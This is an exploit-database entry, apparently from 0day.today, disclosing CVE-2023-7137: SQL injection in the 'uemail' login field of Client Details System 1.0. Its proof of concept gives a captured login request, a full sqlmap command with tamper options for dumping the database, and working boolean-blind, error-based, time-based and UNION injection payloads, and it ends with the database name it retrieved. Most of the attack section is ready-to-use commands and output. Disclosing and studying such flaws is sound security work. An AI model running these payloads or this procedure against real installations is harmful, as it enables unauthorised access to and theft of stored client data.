@@ -1,0 +1,79 @@
+id: 39443
+date: 03/12/2024
+title: Client Details System 1.0 - SQL Injection Vulnerability
+author: Hamdi Sevben
+cves: CVE-2023-7137
+
++ **Exploit Title:** CVE-2023-7137_Client_Details_System-SQL_Injection_1
++ **Exploit Author:** Hamdi Sevben
++ **Vendor Homepage:** https://code-projects.org/client-details-system-in-php-with-source-code/
++ **Software Link:** https://download-media.code-projects.org/2020/01/CLIENT_DETAILS_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
++ **Version:** 1.0
++ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
++ **CVE:** CVE-2023-7137
+
+## References: 
++ **CVE-2023-7137:** https://vuldb.com/?id.249140
++ https://www.cve.org/CVERecord?id=CVE-2023-7137
++ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7137
++ https://nvd.nist.gov/vuln/detail/CVE-2023-7137
+
+## Description:
+Client Details System 1.0 allows SQL Injection via parameter 'uemail' in "/clientdetails/". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.
+
+## Proof of Concept:
++ Go to the User Login page: "http://localhost/clientdetails/"
++ Fill email and password.
++ Intercept the request via Burp Suite and send to Repeater.
++ Copy and paste the request to a "r.txt" file.
++ Captured Burp request:
+```
+POST /clientdetails/ HTTP/1.1
+Host: localhost
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-us,en;q=0.5
+Cache-Control: no-cache
+Content-Length: 317
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost/clientdetails/
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
+
+uemail=user@mail.com&login=LOG+IN&password=P@ass123
+```
+
++ Use sqlmap to exploit. In sqlmap, use 'uemail' parameter to dump the database. 
+```
+python sqlmap.py -r r.txt -p uemail --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
+```
+
+```
+---
+Parameter: uemail (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: uemail=user@mail.com' OR NOT 6660=6660-- FlRf&login=LOG IN&password=P@ass123
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uemail=user@mail.com' AND (SELECT 6854 FROM(SELECT COUNT(*),CONCAT(0x717a717a71,(SELECT (ELT(6854=6854,1))),0x7176627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Oxlo&login=LOG IN&password=P@ass123
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uemail=user@mail.com' AND (SELECT 5335 FROM (SELECT(SLEEP(5)))qsPA)-- pwtE&login=LOG IN&password=P@ass123
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: uemail=user@mail.com' UNION ALL SELECT NULL,CONCAT(0x717a717a71,0x45575259495444506f48756469467471555975554d6f794d77677a4f50547145735052567278434f,0x7176627871),NULL,NULL,NULL,NULL,NULL-- -&login=LOG IN&password=P@ass123
+---
+[14:58:11] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.53, PHP, PHP 8.1.6
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:58:11] [INFO] fetching current database
+current database: 'loginsystem'
+```
+
++ current database: `loginsystem`
+![1](https://github.com/h4md153v63n/CVEs/assets/5091265/bfbec122-5b56-42df-beda-41dfdcaf527a)
+
+#  0day.today [2024-03-15]  #
